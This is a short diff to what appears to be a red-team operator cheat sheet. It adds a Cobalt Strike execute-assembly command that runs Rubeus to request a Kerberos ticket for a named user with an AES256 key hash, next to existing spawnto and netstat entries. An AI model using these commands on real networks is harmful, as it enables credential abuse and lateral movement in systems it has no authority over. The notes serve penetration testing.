@@ -6,6 +6,11 @@ spawnto x64 %windir%\sysnative\dllhost.exe
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
 ```
+
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
+```
+
 List listening bindings
 ```
 run netstat -anp tcp
